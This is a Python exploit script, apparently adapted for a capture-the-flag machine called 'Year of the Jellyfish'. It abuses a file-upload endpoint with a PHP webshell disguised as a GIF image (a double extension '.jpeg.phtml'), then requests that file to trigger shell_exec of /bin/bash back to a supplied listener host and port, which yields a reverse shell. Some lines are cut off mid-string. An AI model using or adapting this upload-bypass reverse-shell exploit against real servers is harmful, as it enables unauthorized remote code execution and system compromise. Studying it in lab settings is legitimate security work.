## This a modified working script for the machine Year Of the JellyFish
# Added Lines: 8 and 10
# Modified Lines: 20 ==> Added "verify=False" and cookies={'isHuman' : '1'}, line 23 ==> Modified the extension

import requests
import os
import sys
import urllib3 #Added

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) 

if len (sys.argv) != 4:
        print ("specify params in format: python " + sys.argv[0] + " target_url lhost lport")
else:
    url = sys.argv[1] + "/assets/php/upload.php"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-W>

    data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"she_ll.jpeg.phtml\"\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123<?php shell_exec(\"/bin/ba>

    requests.post(url, headers=headers, data=data, verify=False, cookies={'isHuman' : '1'})

    print ("A shell script should be uploaded. Now we try to execute it")
    url = sys.argv[1] + "/assets/data/usrimg/she_ll.jpeg.phtml"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5",>
    requests.get(url, headers=headers, verify=False)
